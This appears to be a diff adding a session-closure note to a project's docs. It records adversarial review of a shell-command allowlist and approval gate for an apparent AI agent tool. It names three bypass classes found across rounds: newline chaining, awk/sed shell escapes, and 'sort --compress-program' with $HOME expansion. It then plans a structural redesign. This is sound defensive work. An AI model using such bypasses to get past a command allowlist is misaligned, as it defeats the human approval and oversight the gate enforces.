+
+Three rounds caught three CRITICAL classes that would have shipped to
+production without the pre-PR-ready adversarial step:
+
+1. Newline chaining (round 1) — bypassed every unit test, every
+   harness case, every code review. Found by adversarial probe in
+   minutes.
+2. awk/sed body-content shell-escape (round 2) — bypassed the
+   post-round-1 test additions because they only tested newline.
+3. `sort --compress-program` + `$HOME` expansion (round 3) —
+   bypassed the post-round-2 awk/sed drop + `..` regex because both
+   were targeted at the previous round's failure mode.
+
+The pattern: each round's remediation tightens against the *current*
+finding; the next round finds something from a class the remediation
+didn't anticipate. This is the empirical signal that
+allowlist-by-enumeration cannot keep pace with adversarial pressure.
+
+**Adversarial review becomes mandatory pre-PR-ready for security-relevant
+slices** (auth, approval, shell, network, filesystem, secret-handling).
+Not a "nice to have"; not a per-PR judgement call. Procedural step.
+
+### Followups
+
+- **Slice 3d (allowlist redesign) — ACCELERATED.** Moved ahead of
+  Slice 4 in the queue. Tyson drafts the design brief separately.
+  Motivation captured here and in CHARLIE_OVERHAUL.md Slice 3d entry.
+  The design must replace allowlist-by-enumeration with a structural
+  approach (candidate: argv-list parser that constructs `execFile`-
+  style argv directly, no `bash -c`, no quoting, no chaining surface).
+- **Open LOW followups (unchanged):**
+  - `awk -i inplace` (FLOW_OS_STATE.md) — moot once Slice 3d lands.
+  - `pm2 restart` / `pm2 reload` documentation drift in
+    `src/tools/shell-exec.js` — moot once Slice 3d lands.
+  - `Agent: unknown` in approval-prompt action text (from Slice 3b.1
+    review) — unrelated to the shell layer.
+
+### Branch + PR state
+
+Branch `cc/slice3c1-allowlist-ordering-fix-20260515-1944`:
+- `26bbe79` Unit 1: gate ordering fix in approval-gate.js (KEPT)
+- `41f62b8` Unit 2: verification harness (KEPT)
+- `c54d727` Unit 3: ordering test + docs (KEPT)
+- `99a8809` Round 1 remediation: newline regex + regression test (KEPT)
+- `2de6aff` Round 1 remediation: C4 harness + newline C2 + docs (KEPT)
+- `a12d260` Round 2 remediation: awk/sed drop + `..` traversal (REVERTED below)
+- `2389bc1` Scope reduction: revert a12d260 (this session)
+- `9bbf30c` Feature flag QCLAW_SHELL_EXEC_ENABLED (this session)
+- `91e5d30` Role/lane/delegation route to claude_code_dispatch (this session)
+- (this commit) Closure docs + CHARLIE_OVERHAUL Slice 3d acceleration
+
+PR #24 remains DRAFT. Tyson will dispatch round 4 adversarial review
+after closure ships.
+
+End of session 2026-05-15 Slice 3c.1 closure.
